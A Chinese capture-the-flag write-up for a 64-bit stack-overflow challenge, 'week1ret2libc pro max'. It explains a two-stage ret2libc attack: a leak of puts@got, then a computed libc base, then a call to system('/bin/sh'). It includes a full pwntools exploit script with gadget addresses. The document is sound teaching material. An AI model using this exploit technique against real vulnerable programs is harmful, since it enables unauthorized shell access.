# week1ret2libc pro max

## 题目简述

程序存在 64 位栈溢出，但没有可直接使用的完整后门。利用分两阶段完成：先调用 `puts(puts@got)` 泄露 libc 地址并返回程序入口，再根据题目提供的 `libc-2.23-ubuntu11.2_amd64` 计算 `system` 和 `/bin/sh`，第二次溢出获得 Shell。

## 解题过程

返回地址偏移为 `0x58`，程序地址固定，可使用以下 ROP 资源：

```text
pop rdi ; ret = 0x401223
puts@plt      = 0x401030
puts@got      = 0x404018
_start        = 0x401060
```

第一阶段令 `rdi=puts@got`，调用 `puts@plt` 输出 GOT 中已经解析的真实函数地址，然后返回 `_start` 重新进入输入流程。第二阶段使用同一 gadget 调用 `system("/bin/sh")`：

```python
from pwn import *

context.arch = "amd64"
io = process("./main")
libc = ELF("./libc-2.23.so", checksec=False)

offset = 0x58
pop_rdi = 0x401223
puts_plt = 0x401030
puts_got = 0x404018
start = 0x401060

stage1 = flat(
    b"A" * offset,
    pop_rdi,
    puts_got,
    puts_plt,
    start,
)

io.recvline()
io.send(stage1)

leaked_puts = u64(io.recvline().rstrip(b"\n").ljust(8, b"\x00"))
libc.address = leaked_puts - libc.sym["puts"]
log.success(f"libc base: {libc.address:#x}")

system = libc.sym["system"]
bin_sh = next(libc.search(b"/bin/sh\x00"))

stage2 = flat(
    b"A" * offset,
    pop_rdi,
    bin_sh,
    system,
)

io.recvline()
io.send(stage2)
io.interactive()
```

若本地运行在进入 `system()` 时因 `movaps` 崩溃，可在第二阶段的 `pop_rdi` 前插入一个单独的 `ret` 调整 16 字节栈对齐。

## 方法总结

标准 ret2libc 链分为“泄露已解析 GOT 地址 → 用匹配 libc 求基址 → 计算目标符号 → 再次溢出调用 `system`”。最重要的复现条件是 libc 文件必须与远端一致；硬编码 `/bin/sh` 偏移不如通过 `libc.search()` 计算可靠。
